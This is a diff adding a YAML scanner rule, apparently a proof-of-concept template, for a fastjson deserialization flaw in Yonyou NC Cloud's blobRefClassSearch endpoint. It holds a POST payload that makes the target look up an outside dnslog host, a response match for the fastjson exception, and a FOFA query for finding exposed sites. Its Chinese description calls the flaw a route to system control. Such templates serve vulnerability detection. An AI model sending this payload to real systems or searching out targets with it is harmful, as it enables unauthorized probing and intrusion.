@@ -1,0 +1,17 @@
+name: yongyouNC-Cloud-rce  #dnslog      
+rules: 
+  - method: POST  
+    path: /ncchr/pm/ref/indiIssued/blobRefClassSearch
+    headers:
+      Content-Type: application/json
+    body: |
+        {"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"hboats.dnslog.cn\"}}}"}
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: com.alibaba.fastjson.JSONException                      
+detail:                          
+  description: "用友NC Cloud blobRefClassSearch接口存在反序列化漏洞，攻击者可利用该漏洞获取系统控制权，截止到2024.10.1仍存在较多该漏洞网站"
+  search:             
+    fofa: app="用友-NC-Cloud"
+    鹰图: 
